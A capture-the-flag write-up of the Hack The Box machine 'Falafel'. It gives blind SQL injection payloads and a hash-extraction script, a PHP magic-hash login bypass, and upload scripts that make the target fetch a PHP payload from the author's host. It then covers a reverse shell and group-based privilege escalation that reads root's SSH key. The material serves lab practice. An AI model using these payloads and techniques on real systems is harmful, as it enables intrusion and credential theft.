---
title: HTB Falafel Writeup
date: 2025-01-26
categories: [CTF, HTB]
tags: [CTF, HTB, Hard]
description: HTB Falafel Writeup
---
# Recon
## Nmap
```bash
nmap -Pn -v -p- -sV --min-rate 5000 falafel.htb -oN falafel.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
# Initial Foothold (Port 80)
Main login page
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_1.png)

By attempting some common username and password combination (e.g. admin:admin), it was observed that different user input seem to produce a different response on the login page.

Most usernames will return "Try again..".
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_2.png)

But for the user "admin", the response is "Wrong identification: admin". This seems to suggest that valid username can be discovered through bruteforcing.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_3.png)

A simple wfuzz command is used to find usernames that does not return the "Try again.." message.
```bash
wfuzz -u http://falafel.htb/login.php -X POST -d "username=FUZZ&password=admin" -w /usr/share/seclists/Usernames/... --hw 657
```
The following usernames seems to be valid at first glance.
```
admin
chris
sleepy
```
However, the response length of username "sleepy" is a bit different from the others. Somehow using the username "sleepy" returns a new message "Hacking attempt detected".
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_4.png)

So based on these observation, some assumptions were made:
- Blind SQL injection seems to be possible
- Some level of SQLi prevention is present

The first step is to figure out if there are any other SQL-related keywords that are blacklisted. These are the ones discovered:
```
sleep
union
benchmark
```

Since we've got 2 seemingly valid usernames, the following boolean-based injection payload seems to work well for identifying if the query is successful or not.
```
chris' AND 1=1;-- - # Returns "Wrong Identification"
chris' AND 1=0;-- - # Returns "Try again..."
```

However, I was a bit stuck here as I have no idea about the table structure or even the table name. Just by guessing, I assumed that there should be column named "password" and created tried the following payload.
```
chris' AND password LIKE '%';-- -
```

The query returns a positive result ("Wrong Identification), which confirms that there is a column named "password".
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_5.png)

To extract the password of user "chris" and "admin", a python script is created to bruteforce through the blind boolean-based SQL injection.
```python
def sql_bruteforce_password(session, username):
    # Bruteforcing number of columns in the table
    global target_login_url
    json_login_data = {'username':'chris', 'password':'admin'}
    col_num = 0
    for i in range (1,10):
        payload = f"chris' ORDER BY {i};-- -"
        json_login_data['username'] = payload
        r = session.post(target_login_url, data=json_login_data)
        if ("Wrong identification" in r.text):
            col_num = i
    print(f"Number of columns in current table: {col_num}")

    # Bruteforcing user password
    alphabet_list = string.ascii_lowercase + string.digits
    password = ''
    end_flag = False
    while (not end_flag):
        for word in alphabet_list:
            payload = f"{username}' AND password LIKE '{password}{word}%"
            json_login_data['username'] = payload
            r = session.post(target_login_url, data=json_login_data)
            if ("Wrong identification" in r.text):
                #print(f"Working payload: {word}")
                password += word
                print(f"Working payload: {password}")
                break
            if (word == alphabet_list[-1]):
                end_flag = True

    print(f"Password hash: {password}")
    return
```

The following password hashes were extracted and the password of user "chris" was cracked.

| Username | Password Hash                    | Password |
| -------- | -------------------------------- | -------- |
| chris    | d4ee02a22fc872e36d9e3751ba72ddc8 | juggling |
| admin    | 0e462096931906507119562988736854 | N/A      |
Logging in as user chris, there is not much on the webpage except a profile page of chris. This is actually a hint for the next step.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_6.png)

Based on the profile, it seems to suggest PHP type juggling (as the website is PHP-based).

Through some online digging, it seems that if a lose comparison ```==``` or ```!=``` is used, PHP might consider variables as a different data type and leading to unexpected comparison results. For example, `'0010e2' == '1e3'` will return `true` as both variables are considered as an integer, where the "e" is the sign for exponential (so both are considered "1" as an integer).

Based on this interesting behaviour, we can see that the admin hash matches the property, where it could be considered as `0 ^ 462096931906507119562988736854` which is just "0". Therefore, any string that produces a hash that starts with `0e` will be considered the same as the admin hash.

From this payload example list (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md#magic-hashes), there are different "magic hashes" that can achieve the same goal.

Using the string`"240610708"` as the password, we are able to login to the admin account.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_7.png)

On the admin page, there is a new page that allows user to upload a file by providing a remote URL to download the image.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_8.png)

By putting in a valid URL, it shows the command that was used to obtain the image.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_9.png)
This suggests 2 possible vulnerabilities:
- OS command injection
- Insecure file upload

After some testing, it seems that OS command injection is not possible as all special characters are properly sanatized before being executed.

Through some fuzzing, it was found that only the following extensions are allowed:
- .png
- .jpg
- .gif

From here, I have been trying to use different filter bypass techniques such as null byte poisoning, double extension to upload a PHP file for code execution. Despite checking hint on the admin profile page, I was still stuck for quite a long time and decided to have a peak at other's writeup.
## Checking 0xdf writeup
From the writeup (https://0xdf.gitlab.io/2018/06/23/htb-falafel.html), it seems that I was not aware there is a filename length check implemented. The output of the page changes when a very long filename is provided in the URL.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_10.png)

By checking the page source, we can see that the filename was truncated by removing trailing characters beyond the length limitation.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_11.png)

This means that using a filename with a certain length and has a double extension (e.g. .php.jpg) will cause the trailing .jpg extension to be truncated, leaving the .php as the file extension.

To fuzz the exact length used, the following python script is used.
```python
# Fuzzing filename limit
    filename_length = 0
    filename = ""
    for i in range(0, 1000):
        filename = "A" * i
        json_upload_data['url'] = f"http://10.10.14.37:8888/{filename}.jpg"
        payload = target_upload_url + f"/?url={json_upload_data['url']}"
        r = s.get(payload)
        if ('The name is too long' in r.text):
            print(f"Filename starts to truncate at: {i}")
            filename_length = i
            break
    filename = "A" * (filename_length - 1) + ".php"
    json_upload_data['url'] = f"http://10.10.14.37:8888/{filename}.jpg"
    payload = target_upload_url + f"/?url={json_upload_data['url']}"
    r = s.get(payload)
    print(r.text)
```

It shows that the filename limit is 233 (excluding the .jpg extension).
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_12.png)
Another script is then created to upload the payload with the very long filename
```python
def file_upload_exploit(session):

    """
    # Fuzzing filename limit
    filename_length = 0
    filename = ""
    for i in range(0, 1000):
        filename = "A" * i
        json_upload_data['url'] = f"http://10.10.14.37:8888/{filename}.jpg"
        payload = target_upload_url + f"/?url={json_upload_data['url']}"
        r = s.get(payload)
        if ('The name is too long' in r.text):
            print(f"Filename starts to truncate at: {i}")
            filename_length = i
            break
    """
    # Upload php file with long filename and double extension
    json_upload_data = {'url':''}
    filename_length = 233
    filename = "A" * (filename_length - 1) + ".php"
    json_upload_data['url'] = f"http://10.10.14.37:8888/{filename}.jpg"
    payload = target_upload_url + f"/?url={json_upload_data['url']}"
    print(f"Payload URL: {payload}")
    r = session.get(payload)

    # Get destination URL
    if "File not found" in r.text:
        print("Unable to locate exploit file")
        sys.exit()
    else:
        soup = BeautifulSoup(r.content, 'html5lib')
        html_pre_objects = soup.find_all('pre')

        # Get directory name
        directory = html_pre_objects[0].get_text().split(" ")[2].split("/")[5].split(";")[0]
        output_url = target_payload_url + "/" + directory + "/" + filename
        print(f"File uploaded to: {output_url}")
```
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_16.png)
A simple `phpinfo();` payload is uploaded and successfully executed as shown below.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_15.png)
Then, a PHP reveres shell is created using revshells.com and initial access to the server is obtained.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_17.png)
# User.txt
By checking the PHP files in /var/www/html, the connection.php file contained the credentials of user "moche" for the database connection.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_18.png)
The credentials can be replayed to obtain access to the server as moche through SSH.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_19.png)
# Root.txt
From the screenshot above, we can see that the user was assigned to multiple system groups. The following groups seems to be interesting:
- adm: have access to log files in /var/log
- audio: access to audio devices
- video: access to video devices

There is a useful blog post that lists what system groups are exploitable.
https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/
(Note: this box was launched back in 2018, while the blog post is published in 2021, therefore this is not how people were able to solve the box back then. I guess it's a little bit of cheating on my end)

## Abusing video group
The video group allows user to access video device, which is basically the screen output.
First, the following command are used to obtain the raw file of the video device output, along with the width and height of the video device.
```bash
cp /dev/fb0 /tmp/fb0.raw
width=$(cat /sys/class/graphics/fb0/virtual_size | cut -d, -f1)
height=$(cat /sys/class/graphics/fb0/virtual_size | cut -d, -f2)
```

Then, a perl script is used to convert the raw file into an image.
```perl
#!/usr/bin/perl -w

$w = shift || 240;
$h = shift || 320;
$pixels = $w * $h;

open OUT, "|pnmtopng" or die "Can't pipe pnmtopng: $!\n";

printf OUT "P6%d %d\n255\n", $w, $h;

while ((read STDIN, $raw, 2) and $pixels--) {
   $short = unpack('S', $raw);
   print OUT pack("C3",
      ($short & 0xf800) >> 8,
      ($short & 0x7e0) >> 3,
      ($short & 0x1f) << 3);
}

close OUT;
```

With this, the following image was obtained showing the password of user "yossi".
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_20.png)
## Abusing disk group
Using the password, we can SSH into the server as yossi. We can see that yossi was assigned to some other system groups different from moshe.

![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_21.png)

Again on the same blog post, it demonstrated that users in the disk group has access to raw data stored in disks and partitions.

By using debugfs, we are able to read files under /root, which included the SSH private key in /root/.ssh/id_rsa.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_22.png)

And from here we can copy the SSH private key and login as root through SSH.
![Screenshot](/assets/img/htb-falafel-writeup-screenshot/image_23.png)
# Lessons Learned
## Fuzzing
From this box, I've learned to write python scripts to perform blind SQL injection manually to extract user hashes as well as fuzzing the limitations of the upload functionality. While some steps were done simply by guessing (e.g. type of DBMS used, the existence of a "password" column), I've actually later learned some SQL injection payloads that can be used to extract detailed information as "sqlmap" would.
## Linux system groups and /dev directory
Even though I've been using Linux for my job as a Red Teamer and for these CTF practices, I realized that I am still just a noob when it comes to Linux internals. Not only that I've learned how certain system groups can be abused, I've also learned a bit more about the Linux /dev directory where device files are located.

# Resources
https://www.youtube.com/watch?v=CUbWpteTfio&ab_channel=IppSec
https://0xdf.gitlab.io/2018/06/23/htb-falafel.html
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md
https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
https://www.baeldung.com/linux/dev-directory
